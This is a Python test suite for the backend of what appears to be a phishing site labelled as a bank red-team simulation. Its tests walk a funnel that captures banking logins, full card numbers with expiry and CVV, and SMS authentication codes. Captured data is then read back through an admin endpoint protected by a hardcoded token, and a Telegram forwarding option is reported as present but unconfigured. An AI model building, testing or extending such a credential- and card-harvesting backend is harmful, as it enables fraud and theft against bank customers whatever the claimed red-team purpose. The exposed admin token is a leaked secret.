"""
Backend API tests for Certicode Plus TIBER-FR Red Team simulation.
Covers: /api/health, /api/sessions, /api/submissions, /api/admin/submissions
"""
import os
import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "https://certicode-modern-ui.preview.emergentagent.com").rstrip("/")
API = f"{BASE_URL}/api"
ADMIN_TOKEN = "lbp-redteam-debug-2026"


@pytest.fixture(scope="module")
def client():
    s = requests.Session()
    s.headers.update({"Content-Type": "application/json"})
    return s


# ----- Health -----
class TestHealth:
    def test_health_ok(self, client):
        r = client.get(f"{API}/health", timeout=15)
        assert r.status_code == 200
        data = r.json()
        assert data["status"] == "ok"
        # Telegram intentionally not configured
        assert data["telegram_configured"] is False
        assert "time" in data

    def test_root(self, client):
        r = client.get(f"{API}/", timeout=15)
        assert r.status_code == 200
        assert r.json().get("ok") is True


# ----- Sessions -----
class TestSessions:
    def test_create_session(self, client):
        r = client.post(f"{API}/sessions", json={"user_agent": "pytest", "referrer": "test"}, timeout=15)
        assert r.status_code == 200
        data = r.json()
        assert "session_id" in data and len(data["session_id"]) >= 10
        assert "created_at" in data


# ----- Submissions full funnel -----
class TestSubmissionsFunnel:
    @pytest.fixture(scope="class")
    def session_id(self):
        r = requests.post(f"{API}/sessions", json={"user_agent": "pytest-funnel"}, timeout=15)
        assert r.status_code == 200
        return r.json()["session_id"]

    def test_step_login(self, session_id):
        r = requests.post(f"{API}/submissions", json={
            "session_id": session_id,
            "step": "login",
            "fields": {"identifiant": "TEST_client123", "mot_de_passe": "Secret!42"},
        }, timeout=15)
        assert r.status_code == 200
        data = r.json()
        assert data["ok"] is True
        assert "submission_id" in data

    def test_step_card(self, session_id):
        r = requests.post(f"{API}/submissions", json={
            "session_id": session_id,
            "step": "card",
            "fields": {
                "titulaire": "TEST JEAN DUPONT",
                "numero_carte": "4970100000000001",
                "date_expiration": "12/28",
                "cryptogramme": "123",
            },
        }, timeout=15)
        assert r.status_code == 200
        assert r.json()["ok"] is True

    def test_step_sms(self, session_id):
        r = requests.post(f"{API}/submissions", json={
            "session_id": session_id,
            "step": "sms",
            "fields": {"telephone": "0612345678", "code_certicode": "654321"},
        }, timeout=15)
        assert r.status_code == 200
        assert r.json()["ok"] is True

    def test_submissions_persisted(self, session_id):
        # Use admin endpoint to verify persistence
        r = requests.get(f"{API}/admin/submissions", params={"token": ADMIN_TOKEN}, timeout=15)
        assert r.status_code == 200
        body = r.json()
        items = body.get("items", [])
        session_subs = [i for i in items if i.get("session_id") == session_id]
        steps = sorted([i["step"] for i in session_subs])
        assert "login" in steps
        assert "card" in steps
        assert "sms" in steps
        # Verify content of one submission
        card_sub = next(i for i in session_subs if i["step"] == "card")
        assert card_sub["fields"]["numero_carte"] == "4970100000000001"
        assert card_sub["fields"]["cryptogramme"] == "123"


# ----- Admin auth -----
class TestAdminAuth:
    def test_admin_correct_token(self, client):
        r = client.get(f"{API}/admin/submissions", params={"token": ADMIN_TOKEN}, timeout=15)
        assert r.status_code == 200
        data = r.json()
        assert "count" in data
        assert "items" in data
        assert isinstance(data["items"], list)
        # ObjectId must not be present
        if data["items"]:
            assert "_id" not in data["items"][0]

    def test_admin_wrong_token(self, client):
        r = client.get(f"{API}/admin/submissions", params={"token": "wrong-token"}, timeout=15)
        assert r.status_code == 403

    def test_admin_no_token(self, client):
        r = client.get(f"{API}/admin/submissions", timeout=15)
        # Missing required query param -> 422
        assert r.status_code in (403, 422)


# ----- Edge cases -----
class TestEdgeCases:
    def test_submission_without_telegram_still_persists(self, client):
        # Create session
        s = client.post(f"{API}/sessions", json={}, timeout=15).json()["session_id"]
        # Submit
        r = client.post(f"{API}/submissions", json={
            "session_id": s, "step": "login",
            "fields": {"identifiant": "TEST_x", "mot_de_passe": "TEST_y"}
        }, timeout=15)
        assert r.status_code == 200
        assert r.json()["ok"] is True

    def test_submission_extra_fields_ignored(self, client):
        s = client.post(f"{API}/sessions", json={}, timeout=15).json()["session_id"]
        r = client.post(f"{API}/submissions", json={
            "session_id": s, "step": "login",
            "fields": {"identifiant": "TEST_z", "mot_de_passe": "p"},
            "extra_unknown": "ignored"
        }, timeout=15)
        assert r.status_code == 200
